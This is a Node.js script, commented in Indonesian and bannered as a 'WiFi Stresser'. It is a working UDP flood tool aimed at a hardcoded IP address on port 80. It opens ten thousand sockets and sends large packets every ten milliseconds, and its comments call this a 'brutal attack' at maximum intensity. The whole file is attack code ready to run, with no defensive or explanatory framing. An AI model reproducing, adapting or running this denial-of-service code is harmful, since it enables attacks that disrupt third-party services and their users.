const dgram = require('dgram');

// Target dan port
const target = '108.177.96.113';
const port = 80;

// Payload generator
function generatePayload(size) {
    return Buffer.alloc(size, 'A');
}

const payload = generatePayload(65500);

// Meningkatkan jumlah socket yang aktif untuk serangan
const sockets = [];
const maxSockets = 10000; // Jumlah socket diperbanyak untuk serangan lebih brutal

for (let i = 0; i < maxSockets; i++) {
    sockets.push(dgram.createSocket('udp4'));
}

// Fungsi serangan brutal dengan intensitas tinggi
function brutalAttack() {
    setInterval(() => {
        sockets.forEach((socket) => {
            for (let i = 0; i < 200; i++) { // Jumlah paket per iterasi ditingkatkan
                socket.send(payload, 0, payload.length, port, target, (err) => {
                    if (err) console.error('Error pengiriman paket:', err);
                });
            }
        });
    }, 10); // Interval lebih cepat untuk intensitas maksimum
}

// Memulai serangan
brutalAttack();

// Tampilan banner
console.clear();
console.log(`
██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
PermenMD WiFi Stresser | REWORKED BY FdilzXDilzX
========================================================================
Mode serangan ekstrim aktif. Tekan Ctrl + C untuk menghentikan.
`);
